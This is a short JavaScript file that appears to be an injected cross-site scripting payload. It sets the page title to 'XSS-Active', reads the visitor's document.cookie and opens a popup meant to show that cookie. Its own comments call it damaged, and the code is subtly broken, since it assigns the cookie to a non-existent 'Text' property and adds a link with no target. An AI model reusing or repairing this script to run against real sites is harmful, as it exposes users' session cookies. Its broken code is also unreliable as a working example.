document.title = "XSS-Active"
//Put Back the variable used to invoke the XSS
//Script damaged!
var websession  = '1';
var mysessionno  = '1';
var CurrDT          = new Date();
var TimeAsMS        = CurrDT.getTime();
var LastRefresh = TimeAsMS;
var timeoutlength = 9999000;

//Get Cookie
var UsersCookie = document.cookie;


function createPopup(){
var popup = open("", "Popup", "width=300,height=200");
var txtOk = popup.document.createElement("TEXTAREA");
txtOk.Text = UsersCookie;
var aOk = popup.document.createElement("a");
aOk.innerHTML = "Click here";

popup.document.body.appendChild(txtOk);
popup.document.body.appendChild(aOk);
}

createPopup();
